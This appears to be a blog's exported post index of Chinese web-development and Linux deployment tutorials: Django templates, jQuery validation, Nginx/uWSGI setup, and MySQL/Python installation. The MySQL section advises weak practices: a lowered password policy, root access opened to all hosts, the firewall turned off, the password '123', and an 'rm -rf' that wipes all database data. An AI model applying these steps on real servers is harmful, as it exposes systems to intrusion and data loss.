value=&quot;165&quot;&gt;新疆&lt;/option&gt;&lt;option value=&quot;171&quot;&gt;台湾&lt;/option&gt;&lt;option value=&quot;172&quot;&gt;香港&lt;/option&gt;&lt;option value=&quot;173&quot;&gt;澳门&lt;/option&gt;&lt;option value=&quot;33&quot;&gt;其他省份&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;city_id&quot; name=&quot;city_id&quot;&gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;town_id&quot; name=&quot;town_id&quot; &gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;quarter_id&quot; name=&quot;quarter_id&quot; &gt;&lt;option value=&quot;0&quot;&gt;请选择&lt;/option&gt;&lt;/select&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;详细地址：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;address&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_address&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;详细地址格式为xx省xx市&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;邮政编码：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;post&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_post&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;邮编输入错误&lt;/span&gt;&lt;/li&gt; &lt;/li&gt;&lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt; 手&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;机：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;cellphone&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;label&gt;或&amp;nbsp;&amp;nbsp;固定电话&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;addr_mobile&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_phone&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot;&gt;请输入手机号或者固定电话&lt;/span&gt;&lt;/li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;balance&quot;&gt;&lt;p&gt;商品金额：¥&#123;&#123; sum_price &#125;&#125;&lt;/p&gt;&lt;p class=&quot;yfze&quot;&gt;应付总额（含运费）：&lt;em&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/em&gt;&lt;/p&gt;&lt;p&gt; &lt;a href=&quot;javascript:void (0);&quot; id=&quot;order_sumbit&quot;&gt;提交订单&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;shdz&quot;&gt; &lt;h3&gt;订单1（百知网配送）&lt;/h3&gt; &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt; &lt;tbody&gt;&lt;tr style=&quot;height:30px; line-height:30px;&quot;&gt; &lt;th width=&quot;34%&quot;&gt;商品名称&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;所在仓库&lt;/th&gt; &lt;th width=&quot;13%&quot;&gt;百知价&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;促销价&lt;/th&gt; &lt;th width=&quot;9%&quot;&gt;数量&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;11%&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &#123;% for foo in car %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; foo.book.book_name &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;&#123; foo.book.publish &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;¥&#123;&#123; foo.book.new_price &#125;&#125;（&#123;&#123; foo.book.discount &#125;&#125;折）&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;--&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;&#123; foo.count &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;¥&#123;&#123; foo.totalprice &#125;&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;javascript:void (0);&quot;&gt;放回购物车&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;checkbox&quot; &gt;此订单作为礼品赠送他人&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;&lt;strong&gt;运费：&lt;/strong&gt;当确认送货方式后显示&lt;/td&gt; &lt;td class=&quot;table_zj&quot; colspan=&quot;3&quot;&gt;&lt;strong&gt;小计总额：&lt;/strong&gt;&lt;em&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/em&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"jQuery-配送地址下拉框","slug":"jQuery-配送地址下拉框","date":"2020-09-17T12:14:59.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/09/17/jQuery-配送地址下拉框/","permalink":"http://example.com/2020/09/17/jQuery-%E9%85%8D%E9%80%81%E5%9C%B0%E5%9D%80%E4%B8%8B%E6%8B%89%E6%A1%86/","excerpt":"jQuery-配送地址下拉框 使用jQuery-配送地址下拉框","text":"jQuery-配送地址下拉框 使用jQuery-配送地址下拉框 jQuery-配送地址下拉框1234567891011121314151617&#123;# 选择配送地址 #&#125;$(&#x27;#select&#x27;).change(function () &#123; var a = $(&#x27;#select option:selected&#x27;); if (a.val() !== &quot;&quot;) &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;readonly&#x27;); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[0]).val(a.attr(&#x27;name&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[1]).val(a.attr(&#x27;address&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[2]).val(a.attr(&#x27;post_code&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[3]).val(a.attr(&#x27;addr_mobile&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[4]).val(a.attr(&#x27;cell_phone&#x27;)); &#125;else &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;&#x27;); for (var i=0; i &lt; $(&#x27;input[type=&quot;text&quot;]&#x27;).size();i++) &#123; $($(&#x27;input[type=&quot;text&quot;]&#x27;)[i]).val(&quot;&quot;) &#125; &#125;&#125;) html样式12345678910111213141516171819202122&lt;div class=&quot;address&quot; id=&quot;dp_adress&quot;&gt; &lt;span class=&quot;icon_adr&quot;&gt;&amp;nbsp;&lt;/span&gt;配送地址： &#123;% if address %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;&quot; class=&quot;select_add1&quot;&gt;请选择收货地址&lt;/option&gt; &#123;% for address1 in address %&#125; &lt;option class=&quot;select_add1&quot; value=&quot;&#123;&#123; address1.id &#125;&#125;&quot; name=&quot;&#123;&#123; address1.name &#125;&#125;&quot; address=&quot;&#123;&#123; address1.address &#125;&#125;&quot; post_code=&quot;&#123;&#123; address1.post_code &#125;&#125;&quot; cellphone=&quot;&#123;&#123; address1.cellphone &#125;&#125;&quot; addr_mobile=&quot;&#123;&#123; address1.addr_mobile &#125;&#125;&quot; class=&quot;address_select&quot;&gt;&#123;&#123; address1.address &#125;&#125;&lt;/option&gt; &#123;% endfor %&#125; &lt;/select&gt; &#123;% else %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select_add&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;请选择收货地址&quot;&gt;您还没有添加收货地址&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; &#123;% endif %&#125; &lt;!--&lt;a href=&quot;#&quot; class=&quot;tip&quot;&gt;&lt;/a&gt;--&gt; &lt;span class=&quot;tip_c&quot; style=&quot;display:none;&quot;&gt;针对不同配送地址，您的货物可能出现缺货或无货状态，敬请谅解。&lt;/span&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"jQuery-前端正则化校验","slug":"Jquery-前端正则化校验","date":"2020-09-14T09:29:50.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/14/Jquery-前端正则化校验/","permalink":"http://example.com/2020/09/14/Jquery-%E5%89%8D%E7%AB%AF%E6%AD%A3%E5%88%99%E5%8C%96%E6%A0%A1%E9%AA%8C/","excerpt":"邮箱,手机号,密码强度 正则校验 比较常用的正则校验","text":"邮箱,手机号,密码强度 正则校验 比较常用的正则校验 jQuery-前端正则化校验失焦校验验证用户名是否为邮箱或手机号1&lt;script src=&quot;/static/js/jquery.1.4.2-min.js&quot;&gt;&lt;/script&gt; 123456789101112131415&#123;#table下的所有的收入框失焦验证信息#&#125;$(&#x27;#txt_username&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; //根据判断结果相应改变效果 if (re_phone.test($(&quot;#txt_username&quot;).val()) || re_email.test($(&quot;#txt_username&quot;).val())) &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;&#x27;); &#125;else &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;请检查手机号或邮箱的格式！&#x27;); &#125;&#125;); 失焦校验密码强弱程度12345678910111213141516171819202122232425262728293031323334353637383940&#123;# 密码强弱 #&#125; $(&#x27;#txt_password&#x27;).blur(function () &#123; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/; var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/; var pwd = $(&quot;#txt_password&quot;).val(); if (pwd.length &lt; 6)&#123; $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&quot;密码长度小于6位&quot;) return false &#125; else if (re_strong.test(pwd)) &#123; $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;, &#x27;icon_yes&#x27;); return true &#125;else if (re_medium.test(pwd)) &#123; $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else if (re_week.test(pwd))&#123; $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125; &#125;); 比较常用的正则校验12345678910111213141516//校验普通电话、传真号码：可以“+”开头，除数字外，可含有“-” var patrn = /^[+]&#123;0,1&#125;(d)&#123;1,4&#125;[ ]?([-]?((d)|[ ])&#123;1,12&#125;)+$/;//校验邮政编码 var patrn = /^[a-zA-Z0-9 ]&#123;3,12&#125;$/;//校验是否IP地址 var patrn = /^[0-9.]&#123;1,20&#125;$/;//校验密码强弱var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/;var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/;var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/;//校验电话var re_phone = /^1[34578]\\d&#123;9&#125;$/;//校验emailvar re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; 123456789101112131415Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\\.?InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|4|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$电话号码(&quot;XXX-XXXXXXX&quot;、&quot;XXXX-XXXXXXXX&quot;、&quot;XXX-XXXXXXX&quot;、&quot;XXX-XXXXXXXX&quot;、&quot;XXXXXXX&quot;和&quot;XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125;电话号码正则表达式（支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号）: ((\\d&#123;11&#125;)|^((\\d&#123;7,8&#125;)|(\\d&#123;4&#125;|\\d&#123;3&#125;)-(\\d&#123;7,8&#125;)|(\\d&#123;4&#125;|\\d&#123;3&#125;)-(\\d&#123;7,8&#125;)-(\\d&#123;4&#125;|\\d&#123;3&#125;|\\d&#123;2&#125;|\\d&#123;1&#125;)|(\\d&#123;7,8&#125;)-(\\d&#123;4&#125;|\\d&#123;3&#125;|\\d&#123;2&#125;|\\d&#123;1&#125;))$)身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：(^\\d&#123;15&#125;$)|(^\\d&#123;18&#125;$)|(^\\d&#123;17&#125;(\\d|X|x)$)帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]&#123;8,10&#125;$强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125;一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"Jquery-实现倒计时跳转","slug":"Jquery-实现倒计时跳转","date":"2020-09-14T08:07:55.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/14/Jquery-实现倒计时跳转/","permalink":"http://example.com/2020/09/14/Jquery-%E5%AE%9E%E7%8E%B0%E5%80%92%E8%AE%A1%E6%97%B6%E8%B7%B3%E8%BD%AC/","excerpt":"jquery以及js实现自动跳转界面","text":"jquery以及js实现自动跳转界面 Jquery-实现倒计时跳转jquery实现 1234567891011121314151617&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; //使用匿名函数方法 function counttime() &#123; var $time = $(&#x27;#Time&#x27;); if($time.html() === &#x27;1&#x27;)&#123; window.location.href=(&quot;http://www.baidu.com&quot;); &#125;else&#123; $time.html($time.html()-1); &#125; &#125; setInterval(counttime,1000);&lt;/script&gt;&lt;body&gt; &lt;p id=&quot;Time&quot;&gt;5&lt;/p&gt;&lt;/body&gt; js实现 12345678910111213141516171819&lt;script&gt; //使用匿名函数方法 function countDown()&#123; var time = document.getElementById(&quot;Time&quot;); //alert(time.innerHTML); //获取到id为time标签中的内容，现进行判断 if(time.innerHTML == 0)&#123; //等于0时清除计时 window.location.href=&quot;https://www.baidu.com&quot;; &#125;else&#123; time.innerHTML = time.innerHTML-1; &#125; &#125; //1000毫秒调用一次 setInterval(countDown,1000);&lt;/script&gt;&lt;body&gt; &lt;p id=&quot;Time&quot;&gt;5&lt;/p&gt;&lt;/body&gt;","categories":[],"tags":[{"name":"Jquery","slug":"Jquery","permalink":"http://example.com/tags/Jquery/"}]},{"title":"Pycharm连接MySQL问腿","slug":"Pycharm连接MySQL问腿","date":"2020-09-03T23:32:18.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/04/Pycharm连接MySQL问腿/","permalink":"http://example.com/2020/09/04/Pycharm%E8%BF%9E%E6%8E%A5MySQL%E9%97%AE%E8%85%BF/","excerpt":"Pycharm连接MySQL数据库问题报错08001","text":"Pycharm连接MySQL数据库问题报错08001 Pycharm连接MySQL问题问题:错误编号08001解决办法:123456781.在终端里先使用管理员登录mysql，也就是root mysql -uroot -p123 输入命令 show variables like &#x27;%time_zone%&#x27;2.Mysql默认为美国时间，我国时区要晚8小时，因此修改时间即可 set global time_zone = &#x27;+8:00&#x27; ; FLUSH PRIVILEGES;3.设置完以后，退出mysql,重新登录，检查时间是否被修改","categories":[],"tags":[{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"}]},{"title":"Linux-Nginx环境部署","slug":"Linux-Nginx环境部署","date":"2020-09-03T09:50:14.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Linux-Nginx环境部署/","permalink":"http://example.com/2020/09/03/Linux-Nginx%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/","excerpt":"Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。","text":"Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。 Nginx服务器一、Nginx概述1、简介1.1 什么nginxNginx是一款轻量级的Web服务器&#x2F;反向代理服务器 ，其特点是占有内存少，并发能力强。 2.2 nginx的作用 静态HTTP服务器（ 处理静态资源 - 动静分离）： 首先，Nginx是一个HTTP服务器，可以将服务器上的静态文件（图片、CSS、JS文件等）通过HTTP协议展现给客户端。 将静态资源的处理交给Nginx服务器 123# 一个项目中的资源可以为两大类： 1. 动态资源的请求 普通URL -- uwsgi 2. 静态资源的请求 /static/ -- nginx Nginx提供的动静分离是指把动态请求和静态请求分离开，合适的服务器处理合适的请求，使整个服务器系统的性能、效率更高。 uWSGI更适合做动态内容的执行，nginx更适合做静态内容的处理，客户端请求直接访问nginx服务器，留下静态部分处理，动态部分转发给uWSGI服务器，最终实现“动静分离”。 反向代理服务器： 反向代理是指以代理服务器nginx来接受internet上的请求，然后将请求转发给内部网络上的其它服务器uWSGI，并将从uWSGI服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 负载均衡 ： 多在高并发情况下需要使用。其原理就是将数据流量分摊到多个服务器执行，减轻每台服务器的压力，多台服务器(集群)共同完成工作任务，从而提高了数据的吞吐量。 2、安装步骤 将tar包发送的linux 解压 tar -zxvf nginx-1.11.1.tar.gz 安装依赖 yum install gcc zlib-devel pcre-devel cd到解压目录：./configure #配置检测 cd到解压目录：make &amp;&amp; make install #编译并安装 安装完成，安装路径为/usr/local/nginx ,日志路径为 /usr/local/nginx/logs , 可执行文件路径为 /usr/local/nginx/sbin ,配置文件路径为 /usr/local/nginx/conf 欢迎页面路径为 /usr/local/nginx/html ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx 制作连接，便于执行nginx指令 nginx #启动nginx -s stop #关闭nginx -s reload #重启 http://ip:80即可访问nginx欢迎页面 二、nginx与uWSGInginx配置–到配置路径中的nginx.conf /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920upstream ems&#123; server 192.168.157.141:9001; # uWSGI&#x27;s socket = #server 192.168.157.142:9001; #192.168.x.x:9001 #可以在添加其他的uWSGI的服务器&#125;server &#123; listen 80; server_name 192.168.157.142; # nginx服务器的ip charset utf-8; location / &#123; uwsgi_pass ems; #和上面的upstream转接 include /usr/local/nginx/conf/uwsgi_params; &#125; location /static &#123; alias /usr/local/static; &#125; ...｝ 配置好后，重启nginx即可，可以使用Nginx服务器来访问项目 注意关闭防火墙！！ 两台虚拟主机，一个运行nginx，其中保存project的静态资源；一个运行uwsgi，其中保存并部署project。 三、集群和负载均衡策略搭建uWSGI集群，只需要多做几份uWSGI的配置文件，文件中设置不同的ip:port，指向相同的project，然后启动多个uWSGI即可。 12345678910111213141516171819202122*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125; 至此，一个uWSGI集群搭建完成，nginx作为反向代理服务器和web服务器接收请求，然后处理静态的部分，动态部分按照负载均衡策略转发给某一个uWSGI服务器。 123# 集群解决了什么问题： 1. 高并发 2. 高完整性（高可用性） 至此python-web-project成功运行于 一个对高并发有更好支持，具有高可用性（high-available）的系统中","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Linux-环境部署收集","slug":"Linux-环境部署收集","date":"2020-09-03T09:47:36.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/03/Linux-环境部署收集/","permalink":"http://example.com/2020/09/03/Linux-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E6%94%B6%E9%9B%86/","excerpt":"MySQL5.7安装 ,Python安装,Django安装,uWSGI服务器","text":"MySQL5.7安装 ,Python安装,Django安装,uWSGI服务器 项目环境部署一、MySQL5.7安装1、安装方式1.1 方式一 yum安装（推荐使用该方式）在CentOS中默认安装有MariaDB，这个是MySQL的分支 如果必须要安装MySQL，首先必须添加mysql社区repo通过输入命令： rpm -ivh http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 然后再yum install -y mysql-server # yum安装，需要外网环境 1.2 方式二 rpm安装（不建议） rpm -ivh perl-*.rpm #安装所有perl依赖 rpm -Uvh mysql-libs-5.1.73-7.el6.i686.rpm #更新mysql的类库 rpm -ivh mysql-5.1.73-7.el6.i686.rpm mysql-server-5.1.73-7.el6.i686.rpm #安装mysql主服务 2、启动MySQL服务 systemctl start/stop/restart/status mysqld 查看MySQL运行状态： systemctl status mysqld.service 3、使用MySQL注意：以下方式针对mysql5.7 初次使用，需要找到root的密码： grep &quot;password&quot; /var/log/mysqld.log 找到密码后，连接数据库 mysql -uroot -p密码 输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库： ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new password&#39;; 1234567891011遇到错误： ERROR 1819 (HY000): Your password does not satisfy the current policy requirements 解决方案：1、首先需要设置密码的验证强度等级，设置 validate_password_policy 的全局参数为 LOW 即可，输入设值语句 “ set global validate_password_policy=LOW; ” 进行设值2、当前密码长度为 8 ，如果不介意的话就不用修改了，按照通用的来讲，设置为 6 位的密码，设置 validate_password_length 的全局参数为 6 即可，输入设值语句 “ set global validate_password_length=6; ” 进行设值3、再重置密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;4、查看 mysql 初始的密码策略，输入语句 “ SHOW VARIABLES LIKE &#x27;validate_password%&#x27;; ” 进行查看 选择数据库use mysql 选择表 查询表 4、MySQL远程连接 到mysql库的user表中 update user set host=&#39;%&#39; where user=&#39;root&#39;; #添加可以远程访问的账号 MySQL5.7版本 flush privileges; #刷新权限，保证新添加的账号可用 关闭linux的防火墙，保证3306可以访问 5、MySQL卸载 rpm -e mysql-server需要完整的包名 通过rpm -qa | grep mysql查找包名 #只需卸载主服务即可 rm -rf /var/lib/mysql #删除所有mysql的数据 6、MySQL root密码找回（重置）找到/etc/my.cnf 123[mysqld]...skip-grant-tables //注意，建议在拆除网线的情况下添加 (而且添加配置后，需要重启mysqld服务) 1234[root@Server ~] mysql -urootmysql&gt; use mysql;mysql&gt; update user set password=password(&#x27;123&#x27;) where host=&#x27;localhost&#x27;; //修改密码mysql&gt; flush privileges; 然后将如上配置删除或注释 123# 将开发好的项目部署到Linux系统 Linux 而不是windows （开发）# Day01 - Linux基本指令 -- 字符界面 无法使用鼠标# Day02 - 安装环境MySQL Python 上传项目 部署运行项目 二、Python安装1、安装依赖 yum -y install python-devel openssl-devel bzip2-devel zlib-devel expat-devel ncurses-devel sqlite-devel gdbm-devel xz-devel tk-devel readline-devel gcc yum -y groupinstall “Development tools” 如上两步，汇总安装了python生产环境的各种第三方依赖包 2、安装Python 将python的tar包发送给linux (建议位置：&#x2F;usr&#x2F;local&#x2F;) 解压tar包:tar -zxvf Python-3.5.2.tgz cd到解压目录中配置：./configure --prefix=/usr/local/python3 --enable-optimizations 目的：检测环境中依赖是否完整，设置python的安装位置，同时生成一个编译文件，用于进行python编译：make 在解压目录中：先 make 编译 然后 make install 安装 123456安装后的日志如下....Collecting setuptoolsCollecting pipInstalling collected packages: setuptools, pipSuccessfully installed pip-8.1.1 setuptools-20.10.1 将python3 设置为系统默认python解释器 将&#x2F;usr&#x2F;bin下的python文件改名 mv /usr/bin/python /usr/bin/python2.7.5 将python3的执行文件链接到 &#x2F;usr&#x2F;bin&#x2F;python ln -s /usr/local/python3/bin/python3 /usr/bin/python 12# 执行以上两步操作并不是把python3安装目录添加到环境变量中# 而是将python3安装目录下python3解释器软链接到某一个环境变量的目录下 设置环境变量：&#x2F;etc&#x2F;profile中添加配置 123在文件末尾追加，不要改动文件的其他内容！！！！！！！export python_home=/usr/local/python3export PATH=$PATH:$python_home/bin 注意，设置好后，为了让环境变量生效：source /etc/profile，然后 python3即可进入python3的环境 更新pip pip3 install --upgrade pip 补充： 安装yum install mysql-devel 由于yum用python2编译执行，所以需要单独为yum设置为python2，找到/usr/bin/yum文件，修改文件头：#!/usr/bin/python2.7.5 修改 &#x2F;usr&#x2F;libexec&#x2F;urlgrabber-ext-down 文件的第一行改为 ‘#!/usr/bin/python2.7.5’ 12345678910111213141516171819202122232425# 总结Python安装步骤： 1. 安装依赖 两长串复制过去直接执行 -- 注意需要外网 2. 将python3.6+的tar包发送到linux系统中 建议放在/usr/local下 3. 解压tar包 4. 进入解压目录，执行 ./configure --prefix=/usr/local/python3 --enable-optimizations 5. 执行 make 指令 -- 注意时间较长 6. make install 即可完成安装 -- 安装完后在/usr/local/python3下就是python的安装文件 # 发软链接 1. 将默认的Python2版改名 mv /usr/bin/python /usr/bin/python2.7.5 2. 再将python3下的解释发快捷方式到/usr/bin下 ln -s /usr/local/python3/bin/python3 /usr/bin/python # 配置环境变量 1. vi /etc/profile文件下 在最后面添加下面的内容： export PATH=$PATH:/usr/local/python3/bin/ 2. 让环境变量生效 执行 source /etc/profile即可 # 更新pip 1. 执行 pip3 install --upgrade pip # 修改yum文件头 yum默认是基于python2 1. vi /usr/bin/yum 